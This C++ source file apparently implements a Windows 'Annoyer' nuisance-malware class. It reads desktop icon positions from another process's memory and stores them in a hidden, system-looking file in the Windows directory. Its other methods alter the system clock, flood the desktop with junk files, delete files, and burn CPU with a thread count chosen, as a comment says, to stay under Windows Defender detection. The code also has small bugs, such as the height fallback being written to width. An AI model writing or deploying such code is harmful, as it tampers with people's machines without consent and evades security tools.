#include "Main.h"
#include "Annoyer.h"
#include "Utils.h"
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <windows.h>
#include <commctrl.h>
#include <fstream>
#include <ShlObj.h>

Annoyer::Annoyer()
{
	time_t now = time(NULL);
	localtime_s(&born_date, &now);
}

int Annoyer::j_cli_with_msg(char* msg) {
	startCMD();
	return 0;
}

// TODO - Method to un-shuffle and return the original icon positions
// (based on tools_189702.sys file, which contains an array of)

int Annoyer::j_desktop_shuffle() {
	std::wstringstream ss;
	RECT rect;
	int width;
	int height;

	// Must get the handle of desktop's listview and then you can reorder that listview
	HWND progman = FindWindow(L"progman", NULL);
	HWND shell = FindWindowEx(progman, NULL, L"shelldll_defview", NULL);
	HWND hwndListView = FindWindowEx(shell, NULL, L"syslistview32", NULL);
	int nIcons = ListView_GetItemCount(hwndListView);

	if (GetWindowRect(progman, &rect))
	{
		width = rect.right - rect.left;
		height = rect.bottom - rect.top;
		//std::cout << width << std::endl;
		//std::cout << height << std::endl;
	}
	else {
		width = 1080;
		width = 720;
	}

	// Create rollback data file in C:\windows if it does not exist
	TCHAR win_path[MAX_PATH];
	GetWindowsDirectory(win_path, MAX_PATH);
	//PWSTR desktop_path =  get_desktop_path();

	ss.str(L"");
	ss.clear();
	ss << win_path << L"\\tools_189702.sys";
	//ss << desktop_path << L"\\tools_189702.sys";

	// If file is not found, create it and write there the desktop listview 
	GetFileAttributes(ss.str().c_str());
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(ss.str().c_str()) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		std::ofstream file;
		file.open(ss.str().c_str(), std::ios::out | std::ios::binary);
		POINT* icon_positions = new POINT[nIcons];

		// We must use desktop's virtual memory to get the icons positions
		if (nIcons > 0) {
			DWORD desktop_proc_id = 0;
			GetWindowThreadProcessId(hwndListView, &desktop_proc_id);

			HANDLE h_process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ, FALSE, desktop_proc_id);
			if (!h_process)
			{
				//printf("OpenProcess: error, %u\n", GetLastError());
				return -1;
			}

			LPPOINT pt = (LPPOINT)VirtualAllocEx(h_process, NULL, sizeof(POINT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (!pt)
			{
				//printf("VirtualAllocEx: error, %u\n", GetLastError());
				return -1;
			}

			SIZE_T num_read;

			for (int i = 0; i < nIcons; i++)
			{
				if (!ListView_GetItemPosition(hwndListView, i, pt))
				{
					//printf("GetItemPosition: error, index %d\n", i);
					continue;
				}

				if (!ReadProcessMemory(h_process, pt, &icon_positions[i], sizeof(POINT), &num_read))
				{
					//printf("ReadProcessMemory: error, index %d, error %u\n", i, GetLastError());
					continue;
				}

				printf("Icon[%d]: %ld, %ld\n", i, icon_positions[i].x, icon_positions[i].y);
			}

			VirtualFreeEx(h_process, pt, 0, MEM_RELEASE);
			CloseHandle(h_process);
		}

		file.write(reinterpret_cast<const char*>(icon_positions), sizeof(POINT) *nIcons);
		file.close();

		// Hide the file
		int attrib = GetFileAttributes(ss.str().c_str());
		if ((attrib & FILE_ATTRIBUTE_HIDDEN) == 0) {
			SetFileAttributesW(ss.str().c_str(), attrib | FILE_ATTRIBUTE_HIDDEN);
		}
	}

	std::ifstream testFile;
	testFile.open(ss.str().c_str(),  std::ios::binary);
	if (testFile) {
		POINT* original_positions = new POINT[500]; // Defined 500 icons as max
		int index = 0;
		while (testFile.read(reinterpret_cast<char*>(&original_positions[index]), sizeof(POINT))) {
			printf("ICONOOO [%d]: %ld, %d\n", index, original_positions[index].x, original_positions[index].y);
			index++;
		}
		delete[] original_positions;
		testFile.close();
	}
	else {
		std::cout << "NO SE PUDO LEER FILE\n";
	}

	for (int i = 0; i < nIcons; i++) {
		//ListView_SetItemPosition(hwndListView, i, rand() % width, rand() % height);
	}

	std::cout << nIcons << std::endl;
	return 0;
}


int Annoyer::j_time_date_mod(tm* t, bool mod_date) {
	SYSTEMTIME st;
	time_t now = time(NULL);
	struct tm now_struct;

	localtime_s(&now_struct, &now);

	st.wHour = t->tm_hour;
	st.wMinute = t->tm_min;
	st.wSecond = t->tm_sec;
	st.wMilliseconds = 000;

	if (mod_date) {
		st.wYear = t->tm_year;
		st.wMonth = t->tm_mon;
		st.wDay = t->tm_mday;
	}
	else { // Set current date
		st.wYear = now_struct.tm_year + 1900;
		st.wMonth = now_struct.tm_mon + 1;
		st.wDay = now_struct.tm_mday;
	}

	if (SetSystemTime(&st)) {
		return 0;
	}
	else {
		return -1;
	}

	return 0;
}

int Annoyer::j_files_creation(int max_files, Filename_fmt fn_fmt) {
	PWSTR desk_path = get_desktop_path();
	std::wstringstream ss;

	if (!desk_path) {
		return -1;
	}

	for (int i = 0; i < max_files; i++) {
		ss.str(L"");
		ss.clear();
		ss << desk_path << L"\\" << gen_filename(fn_fmt);

		HANDLE h = CreateFile(ss.str().c_str(),
			GENERIC_WRITE,
			0,
			0,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			0);

		if (h)
		{
			CloseHandle(h);
		}
		else {
			CoTaskMemFree(desk_path);
			return -1;
		}
	}

	CoTaskMemFree(desk_path);
	return 0;
}

int Annoyer::j_files_removal() {
	PWSTR desk_path = get_desktop_path();
	std::vector<std::wstring> files;
	std::vector<std::wstring>::iterator  it;

	if (!desk_path) {
		return -1;
	}

	files = get_goblin_files_from_path(desk_path);

	for (it = files.begin(); it != files.end(); it++) {
		DeleteFileW((*it).c_str()); // Don't care if the delete fails
	}

	CoTaskMemFree(desk_path);
	return 0;
}

int Annoyer::j_cpu_burn(int seconds) {
	std::atomic_bool stop_flag;
	stop_flag.store(false);

	// 4 threads to warm that CPU. More power triggers Windows Defender detection
	std::thread heater_thread_1(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_2(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_3(heat_cpu, std::ref(stop_flag));
	std::thread heater_thread_4(heat_cpu, std::ref(stop_flag));

	// Wait the designated time
	std::this_thread::sleep_for(std::chrono::seconds(seconds));

	// Notify the threads the game has finished
	stop_flag.store(true);

	heater_thread_1.join();
	heater_thread_2.join();
	heater_thread_3.join();
	heater_thread_4.join();

	return 0;
}

